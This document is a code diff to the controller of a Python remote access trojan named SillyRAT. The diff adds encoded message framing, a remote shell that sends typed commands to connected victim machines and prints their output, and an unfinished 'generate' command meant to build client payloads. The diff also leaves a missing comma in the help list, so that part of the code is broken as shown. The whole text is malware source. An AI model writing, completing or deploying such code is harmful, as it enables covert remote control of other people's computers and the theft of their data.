@@ -2,7 +2,9 @@ import sys
 import os
 import socket
 import time
+import base64
 import tabulate
+import signal
 import argparse
 import threading
 
@@ -83,7 +85,8 @@ class PULL:
             ('help', 'Shows manual for commands'),
             ('sessions', 'Show all connected clients to the server'),
             ('connect', 'Connect to a Specific Client'),
-            ('shell'  , 'Launch a New Terminal/Shell.')
+            ('generate', 'Generate a new Client Application')
+            ('shell'  , 'Launch a New Terminal/Shell.'),
             ('exit', 'Exit from SillyRAT!')
         ]
         sys.stdout.write("\n")
@@ -107,14 +110,43 @@ pull = PULL()
 class CLIENT:
     
     STATUS = "Active"
+    MESSAGE = ""
+    KEY     = ")J@NcRfU"
 
     def __init__(self, sock, addr):
         self.sock    = sock
         self.ip      = addr[0]
         self.port    = addr[1]
 
+    def acceptor(self):
+        data = ""
+        chunk = ""
+
+        while True:
+            chunk = self.sock.recv(4096)
+            if not chunk:
+                self.STATUS = "Disconnected"
+                break
+            data += chunk.decode('utf-8')
+            if self.KEY.encode('utf-8') in chunk:
+                self.MESSAGE = data.rstrip(self.KEY)
+                data = ""
+
     def engage(self):
-        return
+        t = threading.Thread(target=self.acceptor)
+        t.daemon = True
+        t.start()
+
+    def send_data(self, val):
+        self.sock.send(base64.encodebytes(val.encode('utf-8')) + self.KEY.encode('utf-8'))
+
+    def recv_data(self):
+        while not self.MESSAGE:
+            try:
+                pass
+            except KeyboardInterrupt: 
+                break
+        return self.MESSAGE
 
 class COMMCENTER:
 
@@ -172,7 +204,34 @@ class COMMCENTER:
         sys.stdout.write("\n")
 
     def c_shell(self):
-        return
+        if self.CURRENT:
+            sys.stdout.write("\n")
+            while True:
+                val = input("# ")
+                val = val.rstrip(" ").lstrip(" ")
+
+                if val:
+                    if val != "exit":
+                        self.CURRENT[1].send_data(val)
+                        print(self.CURRENT[1].recv_data())
+                    else:
+                        break
+        else:
+            sys.stdout.write("\n")
+            pull.error("You need to connect before execute this command!")
+            sys.stdout.write("\n")
+
+    def c_generate(self, vals):
+        if len(vals) == 4:
+            ip = vals[1]
+            port = int(vals[2])
+            path = vals[3]
+
+            
+        else:
+            sys.stdout.write("\n")
+            pull.error("Invalid Syntax!")
+            sys.stdout.write("\n")
 
     def c_exit(self):
         sys.stdout.write("\n")
@@ -243,6 +302,8 @@ class INTERFACE(COMMCENTER):
                 self.c_connect(vals)
             elif vals[0] == "shell":
                 self.c_shell()
+            elif vals[0] == "generate":
+                self.c_generate(vals)
 
     def launch(self):
         pull.print("Launching Interface! Enter 'help' to get avaible commands! \n")
